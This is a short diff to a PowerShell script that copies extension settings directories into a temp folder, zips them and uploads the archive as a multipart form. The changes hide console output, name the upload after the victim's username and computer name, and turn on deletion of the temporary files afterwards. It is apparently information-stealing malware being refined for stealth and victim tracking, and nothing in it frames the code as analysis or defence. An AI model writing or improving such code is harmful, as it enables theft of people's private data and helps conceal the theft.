@@ -12,7 +12,7 @@ $tempDir = "$Env:TEMP\matched_files"
 $zipFilePath = "$tempDir\zora97.zip"
 
 if (-Not (Test-Path -Path $tempDir)) {
-    New-Item -ItemType Directory -Path $tempDir
+    New-Item -ItemType Directory -Path $tempDir | out-null
 }
 
 # Loop through each extension's settings directory and copy to tmp dir
@@ -50,7 +50,7 @@ $fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)
 # Create the multipart body
 $body = @"
 --$boundary
-Content-Disposition: form-data; name="file"; filename="zora97.zip"
+Content-Disposition: form-data; name="file"; filename="$Env:username-$Env:computername.zip"
 Content-Type: application/zip
 
 $( [System.Text.Encoding]::Default.GetString($fileContent) )
@@ -71,4 +71,4 @@ try {
 }
 
 # Clean up temporary files
-# Remove-Item -Path $tempDir -Recurse -Force
+Remove-Item -Path $tempDir -Recurse -Force
